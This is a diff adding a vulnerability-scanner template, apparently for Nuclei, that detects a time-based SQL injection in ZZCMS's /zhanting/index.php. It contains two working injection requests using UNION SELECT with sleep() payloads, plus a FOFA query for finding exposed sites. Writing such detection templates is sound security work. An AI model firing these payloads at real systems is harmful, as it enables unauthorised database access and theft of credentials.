@@ -1,0 +1,31 @@
+id: ZZCMS-index_php-sql-time-CVE-2025-0565
+
+info:
+  name: "ZZCMS index.php SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: "zzcms专业做招商网的程序源码"
+      ZZCMS index.php 路径存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句获取数据库敏感信息（如管理员凭证、用户数据），在具备足够权限时可能进一步在服务器写入恶意文件，导致系统权限被控制。该漏洞的CVSS评分表明其具有较高风险等级，建议及时应用官方补丁进行防护。
+  reference:
+  - https://mp.weixin.qq.com/s/kYSqj_0U6nNp4o2w4cgEgg
+  tags: ZZCMS
+
+
+http:
+- raw:
+  - |
+    GET /zhanting/index.php?id=1'union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,sleep(4)+--+x&skin= HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+  - |
+    GET /zhanting/index.php?id=1'union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,sleep(8)+--+x&skin= HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
